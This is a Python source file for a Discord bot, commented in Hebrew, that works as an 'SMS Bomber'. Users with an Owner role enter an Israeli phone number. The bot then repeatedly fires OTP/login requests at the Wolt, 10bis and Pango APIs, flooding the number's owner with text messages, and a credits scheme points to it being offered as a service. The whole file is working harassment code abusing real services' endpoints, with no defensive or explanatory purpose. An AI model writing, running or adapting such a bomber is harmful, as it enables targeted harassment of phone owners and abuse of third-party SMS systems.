import discord
from discord.ext import commands
import os
import httpx
import asyncio

TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # הפאנל יישאר פעיל תמיד

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # בדיקה שרק Owner יכול ללחוץ
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if not role:
            return await interaction.response.send_message("❌ רק מי שיש לו רול Owner יכול להפעיל את הספאמר!", ephemeral=True)
        
        # יצירת חלון קופץ (Modal) להזנת מספר הטלפון
        modal = SpamModal()
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="My Credits", style=discord.ButtonStyle.secondary, emoji="💰", custom_id="credits_btn")
    async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("💰 המערכת כרגע מוגדרת לשימוש חופשי לבעלי רול Owner.", ephemeral=True)

class SpamModal(discord.ui.Modal, title="SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"🚀 מתחיל הפצצה על {self.phone.value}...", ephemeral=True)
        
        # כאן רשימת ה-URLs מהמאגר שנתתי לך
        apis = [
            {"name": "Wolt", "url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{self.phone.value[1:]}"}},
            {"name": "10bis", "url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": self.phone.value, "isSmsAuth": True}},
            {"name": "Pango", "url": "https://pango.co.il/api/auth/login", "json": {"phone": self.phone.value}}
        ]
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        
        async with httpx.AsyncClient(headers=headers, timeout=10.0) as client:
            for _ in range(3): # 3 סבבים של הפצצה
                tasks = [client.post(api["url"], json=api["json"]) for api in apis]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(5)
        
        await interaction.followup.send(f"✅ ההפצצה על {self.phone.value} הסתיימה!", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # גורם לכפתורים לעבוד גם אחרי שהבוט עושה ריסטארט
        self.add_view(SpamView())

bot = MyBot()

@bot.command()
@commands.has_role(OWNER_ROLE_NAME)
async def setup(ctx):
    embed = discord.Embed(
        title="Spam sms bomber | By Nehoray yosef Lidor belazada",
        description="**💣 Spam Phone**\n1 Credit = 35 seconds\n\n**💰 My Credits**\nCheck your balance",
        color=discord.Color.dark_grey()
    )
    await ctx.send(embed=embed, view=SpamView())

bot.run(TOKEN)
